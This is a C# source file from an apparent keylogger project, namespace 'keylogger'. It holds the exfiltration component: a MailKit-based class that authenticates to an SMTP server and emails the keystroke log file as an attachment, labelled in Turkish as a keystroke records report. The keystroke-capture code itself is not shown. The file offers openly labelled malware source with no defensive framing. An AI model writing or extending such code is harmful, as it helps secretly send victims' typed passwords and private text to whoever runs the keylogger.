using MailKit.Net.Smtp;
using MailKit.Security;
using MimeKit;
using System.Threading.Tasks;

namespace keylogger
{
    public class EmailSender
    {
        private readonly string _host;
        private readonly int _port;
        private readonly string _senderEmail;
        private readonly string _senderPassword;
        private readonly string _receiverEmail;
        public EmailSender(string host, int port, string senderEmail, string senderPassword, string receiverEmail)
        {
            _host = host;
            _port = port;
            _senderEmail = senderEmail;
            _senderPassword = senderPassword;
            _receiverEmail = receiverEmail;
        }

        public async Task SendLogFileAsEmailAsync(string logFilePath)
        {
            var message = new MimeMessage();
            message.From.Add(new MailboxAddress("Keylogger Raporu", _senderEmail));
            message.To.Add(new MailboxAddress("Yönetici", _receiverEmail));
            message.Subject = "Tuş Kayıtları Raporu";

            var builder = new BodyBuilder();
            builder.TextBody = "Log dosyası ektedir.";
            builder.Attachments.Add(logFilePath);
            message.Body = builder.ToMessageBody();

            using (var client = new SmtpClient())
            {
                await client.ConnectAsync(_host, _port, SecureSocketOptions.StartTls);
                await client.AuthenticateAsync(_senderEmail, _senderPassword);
                await client.SendAsync(message);
                await client.DisconnectAsync(true);
            }
        }
    }
}